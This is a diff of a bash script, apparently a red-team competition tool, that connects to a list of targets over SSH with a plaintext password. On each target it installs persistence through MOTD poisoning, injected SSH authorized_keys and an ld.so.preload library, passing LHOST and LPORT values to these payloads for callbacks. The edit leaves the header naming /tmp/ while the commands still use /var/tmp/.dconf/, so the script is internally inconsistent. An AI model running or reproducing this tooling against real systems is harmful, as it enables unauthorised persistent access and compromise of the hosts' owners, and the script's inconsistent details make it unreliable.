@@ -11,11 +11,11 @@ set -uo pipefail
 # Fill in the CONFIG section before running. This script will:
 #   1. Compile the ld.so.preload shared library locally
 #   2. For each target:
-#       a. SCP toolkit files to /var/tmp/.dconf/
+#       a. SCP toolkit files to /tmp/
 #       b. Install MOTD persistence
 #       c. Inject SSH authorized_keys
 #       d. Install ld.so.preload persistence
-#       e. Clean up /var/tmp/.dconf/ files
+#       e. Clean up /tmp/ files
 # =============================================================================
 
 # ── CONFIG — fill these in on comp day ───────────────────────────────────────
@@ -110,7 +110,7 @@ echo ""
 
 for TARGET in "${TARGETS[@]}"; do
     echo "============================================================"
-    info "Deploying to ${TARGET}"`
+    info "Deploying to ${TARGET}"
     echo "============================================================"
 
     # ── Transfer toolkit files ────────────────────────────────────────────
@@ -132,7 +132,8 @@ for TARGET in "${TARGETS[@]}"; do
 
     info "[${TARGET}] Installing MOTD persistence..."
 
-    if run_ssh "$TARGET" "sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/motd_poison.sh <<< '$PASSWORD'" \
+    if sshpass -p "$PASSWORD" ssh $SSH_OPTS "${USER}@${TARGET}" \
+        "echo '${PASSWORD}' | sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/motd_poison.sh" \
         2>/dev/null; then
         success "[${TARGET}] MOTD installed"
     else
@@ -155,7 +156,8 @@ for TARGET in "${TARGETS[@]}"; do
     if [[ -n "$SO_FILE" ]]; then
         info "[${TARGET}] Installing ld.so.preload persistence..."
 
-        if run_ssh "$TARGET" "sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/ld_install.sh <<< '$PASSWORD'" \
+        if sshpass -p "$PASSWORD" ssh $SSH_OPTS "${USER}@${TARGET}" \
+            "echo '${PASSWORD}' | sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/ld_install.sh" \
             2>/dev/null; then
             success "[${TARGET}] ld.so.preload installed"
         else
